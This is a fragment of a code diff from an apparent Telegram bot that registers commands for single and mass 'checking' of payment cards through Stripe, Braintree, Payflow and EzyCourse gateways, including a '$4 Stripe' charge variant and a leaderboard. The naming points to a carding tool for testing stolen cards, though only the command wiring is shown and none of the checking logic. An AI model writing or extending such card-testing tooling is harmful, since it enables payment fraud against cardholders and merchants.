+        asyncio.create_task(ezycourse_mass_check_logic(update, context, cards, progress_msg))
     elif gateway == 'dabbagh_stripe':
         asyncio.create_task(dabbagh_mass_check_logic(update, context, cards, progress_msg))
     else:
@@ -48632,8 +51866,6 @@ def main():
     app.add_handler(CommandHandler("btnm", mass_check_braintree_advanced))
     
     # B3Charged
-    app.add_handler(CommandHandler("b3", single_check_b3charged))
-    app.add_handler(CommandHandler("mb3", mass_check_b3charged))
     
     # Payflow
     app.add_handler(CommandHandler("pf", single_check_payflow_command))
@@ -48739,8 +51971,6 @@ def main():
     app.add_handler(CommandHandler("leaderboard", leaderboard_command))
     app.add_handler(CommandHandler("lb", leaderboard_command))
     
-    app.add_handler(CommandHandler("chk1", single_check_stripe_auth_v2))
-    app.add_handler(CommandHandler("mchk1", mass_check_stripe_auth_v2))
     
     # ============ RECOVERY COMMANDS ============
     app.add_handler(CommandHandler("recover", recover_command))
@@ -48820,6 +52050,15 @@ def main():
     app.add_handler(CommandHandler("off", off_command))
     app.add_handler(CommandHandler("on", on_command))
     app.add_handler(CommandHandler("gateways", gateways_command))
+    
+    app.add_handler(CommandHandler("ch", single_check_ezycourse))
+    app.add_handler(CommandHandler("mch", mass_check_ezycourse))
+    
+    app.add_handler(CommandHandler("b3", single_check_braintree_auth))
+    app.add_handler(CommandHandler("mb3", mass_check_braintree_auth))
+    
+    app.add_handler(CommandHandler("st", single_check_stripe_4usd))
+    app.add_handler(CommandHandler("mst", mass_check_stripe_4usd))
     
     
     app.add_handler(MessageHandler(
